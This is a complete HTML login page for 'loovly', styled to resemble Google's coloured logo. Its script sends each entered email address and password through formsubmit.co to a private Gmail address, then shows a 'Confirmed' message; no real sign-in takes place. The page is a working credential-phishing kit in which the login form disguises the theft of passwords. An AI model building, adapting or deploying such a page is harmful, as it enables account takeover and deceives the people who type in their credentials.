<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>loovly</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:Arial, sans-serif;}
  body{background:#f2f2f2; min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px;}
  .card{background:white; width:100%; max-width:400px; border-radius:16px; padding:35px 25px; box-shadow:0 2px 15px rgba(0,0,0,0.08); border:1px solid #eee;}
  .logo{text-align:center; margin-bottom:25px;}
  .google-logo{font-size:42px; font-weight:900; letter-spacing:-1px;}
  .g-blue{color:#4285F4;} .g-red{color:#EA4335;} .g-yellow{color:#FBBC05;} .g-green{color:#34A853;}
  .input-group{margin-bottom:14px;}
  .input-group input{width:100%; padding:13px 15px; border:1px solid #ddd; border-radius:10px; outline:none; background:#fafafa; font-size:14px;}
  .input-group input:focus{border-color:#4285F4; background:white;}
  .btn{width:100%; padding:13px; background:#4285F4; color:white; border:none; border-radius:10px; font-weight:bold; cursor:pointer; font-size:15px;}
  .success-inline{display:none; background:#d4edda; color:#155724; border:1px solid #c3e6cb; padding:14px; border-radius:10px; text-align:center; font-weight:bold; margin-top:15px;}
  .footer{text-align:center; margin-top:20px; font-size:15px; border-top:1px solid #eee; padding-top:14px; font-weight:900;}
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <div class="google-logo">
      <span class="g-blue">l</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">v</span><span class="g-green">l</span><span class="g-red">y</span>
    </div>
  </div>

  <form id="myForm">
    <div class="input-group"><input type="email" name="email" placeholder="Email" required></div>
    <div class="input-group"><input type="password" name="password" placeholder="Password" required></div>
    <button type="submit" class="btn" id="btn">Login</button>
    <div class="success-inline" id="success">✅ Confirmed</div>
  </form>

  <div class="footer">
    © <span class="g-blue">l</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">v</span><span class="g-green">l</span><span class="g-red">y</span> 2026
  </div>
</div>

<script>
const form = document.getElementById('myForm');
const btn = document.getElementById('btn');
const success = document.getElementById('success');

form.addEventListener('submit', e => {
  e.preventDefault();
  btn.innerText = "Sending...";
  btn.disabled = true;

  const data = new FormData(form);

  fetch("https://formsubmit.co/ajax/mosabshareef2222@gmail.com", {
    method: "POST",
    body: data
  })
  .then(res => res.json())
  .then(() => {
    success.style.display = "block";
    btn.innerText = "Login";
    btn.disabled = false;
    form.reset();
  })
  .catch(() => {
    alert("Error, try again");
    btn.innerText = "Login";
    btn.disabled = false;
  });
});
</script>
</body>
</html>
